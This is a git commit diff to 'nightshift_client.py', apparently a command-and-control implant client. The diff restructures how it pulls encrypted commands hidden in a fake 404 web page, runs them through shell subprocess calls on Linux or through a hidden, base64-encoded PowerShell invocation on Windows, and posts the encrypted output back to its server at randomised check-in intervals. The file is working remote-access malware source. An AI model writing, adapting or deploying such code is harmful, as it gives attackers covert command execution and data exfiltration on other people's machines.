2f9cb0d2db35a9e88e871d015da742811427f02a
Sean Frank <78367642+seangfrank0474@users.noreply.github.com>
2021-02-23 14:15:24 -0500

    Add files via upload
    retooled logic. added two functions os_posix() and os_winnt() and removed the Run_Command() function. It is ready for test on a windows client.

--- nightshift_client.py
+++ nightshift_client.py
@@ -21,7 +21,9 @@ class NightShift_Client():
     
     def run(self):
         try:
+            ns_init_json_path = 'ns_init_call.json'
             ns_init_chkr = NightShift_Init_Check()
+            ns_get_cipher = NightShift_Cipher()
             ns_init_resp = ns_init_chkr.ns_init_check()
             ns_initchk_tf = ns_init_resp[0]
             ns_get_ua = ns_init_resp[1]
@@ -29,27 +31,66 @@ class NightShift_Client():
             ns_fof_url = ns_init_resp[3]
             ns_post_url = ns_init_resp[4]
             if ns_initchk_tf == True:
-                pass
+                 with open(ns_init_json_path) as ns_init_f:
+                     ns_init_data = json.load(ns_init_f)
+                     ns_host_hash = ns_init_data.get('host_hash')
+                     ns_host_data = ns_init_data.get('host_data')
+                     ns_host_os = ns_host_data.get('os_type')
             else:
                 print('Something is afoot and we cannot continue')
                 sys.exit(1)
-            loop = asyncio.get_event_loop()
+            loop = asyncio.get_event_loop()                                                                                                                                                                        
             while True:
                 try:
+                    ns_data_post_resp = 'No response from server, taking a 30 minute power nap.'
+                    ns_ss_sec = 1800
                     ns_fof_html = loop.run_until_complete(self.FourOFour(ns_get_ua,ns_fof_url))
-                    ns_post_data = self.RunCommand(ns_fof_html)
-                    ns_post_cmd = ns_post_data[0]
-                    ns_post_slp = ns_post_data[1]
-                    ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_cmd,ns_post_ua,ns_post_url))
-                    if ns_post_slp >= 1:
-                        ns_ss_sec = 60 * ns_post_slp
+                    ns_payload = ((ns_fof_html.split('HTMLDOC:'))[1].split('HTMLDOC')[0])
+                    ns_decrypt_payload = ns_get_cipher.decrypt(ns_payload)
+                    ns_json_payload = json.loads(ns_decrypt_payload)
+                    ns_host_fof = ns_json_payload['host_404']
+                    ns_host_os_fof = ns_json_payload['host_os_404']
+                    ns_host_os_cmd_fof = ns_json_payload['host_cmd_404']
+                    ns_host_slpstate_fof = ns_json_payload['host_slpstate_404']
+                    if (ns_host_fof == 'ALL' and ns_host_os_fof == 'posix' and ns_host_os_fof == ns_host_os):
+                        print('Do all the Linux things')
+                        ns_get_output = self.os_posix(ns_host_os_cmd_fof)
+                        ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
+                        ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
+                        ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
+                    elif (ns_host_fof == ns_host_hash and ns_host_os_fof == 'posix' and ns_host_os_fof == ns_host_os):
+                        print('Specific Linux Host')
+                        ns_get_output = self.os_posix(ns_host_os_cmd_fof)
+                        ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
+                        ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
+                        ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
+                    elif (ns_host_fof == 'ALL' and ns_host_os_fof == 'nt' and ns_host_os_fof == ns_host_os):
+                        print('Do all the NT things')
+                        ns_get_output = self.os_winnt(ns_host_os_cmd_fof)
+                        print(ns_get_output)
+                        ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
+                        print(ns_json_cmd_output)
+                        ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
+                        print(ns_post_data)
+                        #ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
+                    elif (ns_host_fof == ns_host_hash and ns_host_os_fof == 'nt' and ns_host_os_fof == ns_host_os):
+                        print('Specific NT Host')
+                        ns_get_output = self.os_winnt(ns_host_os_cmd_fof)
+                        ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
+                        ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
+                        #ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
+                    else:
+                        print('Not my turn, I will take a nap')
+                        ns_data_post_resp = 'Not my turn, I will take a nap'
+                        #pass
+                    if ns_host_slpstate_fof >= 1:
+                        ns_ss_sec = 60 * ns_host_slpstate_fof
                     else:
                         ns_rand_num = randrange(1, 120)
                         ns_ss_sec = 60 * ns_rand_num
-                    time_stamp = datetime.now()
-                    print('[+] {0:s} --> Response from NightShif Server --> {1:s} NightShift Client next check-in in --> {2:s} seconds.'.format(str(time_stamp),ns_data_post_resp,str(ns_ss_sec)))
                 except:
                     pass
+                print('[+] {0:s} --> Response from NightShif Server --> {1:s} --> NightShift Client next check-in in --> {2:s} seconds.'.format(str(datetime.now()),ns_data_post_resp,str(ns_ss_sec)))
                 time.sleep(ns_ss_sec)
         except KeyboardInterrupt:
             print('\nInterrupted - NightShift Client exited due to a keyboard interrupt.') 
@@ -86,30 +127,18 @@ class NightShift_Client():
                 ns_post_resp = await response.text()
             return ns_post_resp
 
-    def RunCommand(self,ns_fof_html):
-        ns_get_cipher = NightShift_Cipher()
-        ns_payload = ((ns_fof_html.split('HTMLDOC:'))[1].split('HTMLDOC')[0])
-        ns_decrypt_payload = ns_get_cipher.decrypt(ns_payload)
-        ns_json_payload = json.loads(ns_decrypt_payload)
-        ns_host_fof = ns_json_payload['host_404']
-        ns_host_os_fof = ns_json_payload['host_os_404']
-        ns_host_os_cmd_fof = ns_json_payload['host_cmd_404']
-        ns_host_slpstate_fof = ns_json_payload['host_slpstate_404']
-        ns_init_json_path = 'ns_init_call.json'
-        with open(ns_init_json_path) as ns_init_f:
-            ns_init_data = json.load(ns_init_f)
-            ns_host_hash = ns_init_data.get('host_hash')
-            ns_host_data = ns_init_data.get('host_data')
-            ns_host_os = ns_host_data.get('os_type')
-            time_stamp = datetime.now()
-        if (ns_host_os_fof == 'posix' and ns_host_os_fof == ns_host_os):
-            output = subprocess.check_output(ns_host_os_cmd_fof, shell=True).decode('ascii')
-            output_b64 = base64.b64encode(bytes(output, 'utf-8')).decode('ascii')
-            ns_json_cmd_output = { 'time': str(time_stamp),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': output_b64 }
-            ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
-        else:
-            ns_post_data = "wrong os type"
-        return ns_post_data, ns_host_slpstate_fof
+    def os_posix(self, ns_host_os_cmd_fof):
+        time_stamp = datetime.now()
+        output = subprocess.check_output(ns_host_os_cmd_fof, shell=True).decode('ascii')
+        output_b64 = base64.b64encode(bytes(output, 'utf-8')).decode('ascii')
+        return time_stamp, output_b64
+
+    def os_winnt(self, ns_host_os_cmd_fof):
+        time_stamp = datetime.now()
+        ns_ps_cmd = 'powershell -nop -win hidden -noni -enc "' + base64.b64encode(ns_host_os_cmd_fof.encode('utf_16_le')).decode('utf-8') + '"'
+        output = (Popen(ns_ps_cmd, stdout=PIPE, shell=True).stdout.read())
+        output_b64 = base64.b64encode(bytes(output, 'utf-8')).decode('ascii')
+        return time_stamp, output_b64
 
 if __name__ == "__main__":
     NightShift_Client().run()
